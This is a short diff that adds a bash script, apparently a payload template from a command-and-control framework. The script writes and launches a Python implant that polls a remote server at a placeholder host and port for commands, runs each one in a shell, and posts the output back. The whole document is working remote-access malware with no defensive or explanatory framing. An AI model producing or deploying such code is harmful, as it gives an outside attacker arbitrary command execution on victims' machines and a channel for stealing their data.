@@ -1,0 +1,28 @@
+#!/bin/bash
+SOURCE_FILE="{line}.py"
+cat > $SOURCE_FILE <<EOL
+import requests
+import subprocess
+import time
+import json
+C2_URL = 'http://{lhost}:{lport}'
+CLIENT_ID = '{line}'  
+while True:
+    try:
+        response = requests.get(f'{C2_URL}/command/{CLIENT_ID}')
+        if response.status_code == 200:
+            command = response.text
+            if 'terminate' in command:
+                break
+            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            output = CMD.stdout.read() + CMD.stderr.read()
+            output_str = output.decode('utf-8', errors='replace')
+            json_data = json.dumps({'output': output_str})
+            headers = {'Content-Type': 'application/json'}
+            requests.post(f'{C2_URL}/command/{CLIENT_ID}', data=json_data, headers=headers)
+        time.sleep(5)
+    except Exception as e:
+        print(f'[!] Error: {e}')
+        break
+EOL
+python3 $SOURCE_FILE
